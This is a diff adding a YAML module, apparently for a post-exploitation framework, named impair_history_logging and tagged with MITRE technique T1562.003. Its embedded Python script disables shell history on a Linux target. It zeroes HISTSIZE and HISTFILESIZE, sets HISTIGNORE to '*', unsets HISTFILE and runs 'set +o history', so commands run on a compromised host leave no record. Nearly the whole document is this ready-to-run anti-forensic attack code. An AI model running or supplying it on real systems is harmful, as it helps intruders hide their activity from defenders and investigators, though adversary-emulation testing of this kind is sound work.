@@ -1,0 +1,61 @@
+name: impair_history_logging
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Impairs command history logging on a Linux target by manipulating
+  shell environment variables. Sets HISTCONTROL to ignoreboth (ignore
+  duplicate commands and commands starting with spaces), sets HISTSIZE
+  and HISTFILESIZE to 0 to prevent history storage, and unsets the
+  HISTFILE variable to prevent writing history to disk. Also sets
+  the HISTIGNORE variable to ignore all commands.
+software: ''
+tactics: [TA0005]
+techniques: [T1562.003]
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: false
+language: python
+min_language_version: '2.6'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+script: |
+  import os
+
+  results = []
+
+  env_vars = {
+      'HISTCONTROL': 'ignoreboth',
+      'HISTSIZE': '0',
+      'HISTFILESIZE': '0',
+      'HISTIGNORE': '*',
+  }
+
+  for var, val in env_vars.items():
+      os.environ[var] = val
+      results.append('[+] Set {}={}'.format(var, val))
+
+  # Unset HISTFILE
+  if 'HISTFILE' in os.environ:
+      del os.environ['HISTFILE']
+  results.append('[+] Unset HISTFILE')
+
+  # Also run shell commands to affect subprocesses
+  commands = [
+      'export HISTCONTROL=ignoreboth',
+      'export HISTSIZE=0',
+      'export HISTFILESIZE=0',
+      'unset HISTFILE',
+      'set +o history',
+  ]
+  for cmd in commands:
+      try:
+          run_command(cmd)
+          results.append('[+] Executed: {}'.format(cmd))
+      except Exception as e:
+          results.append('[*] Note: {} ({})'.format(cmd, str(e)))
+
+  print('\n'.join(results))
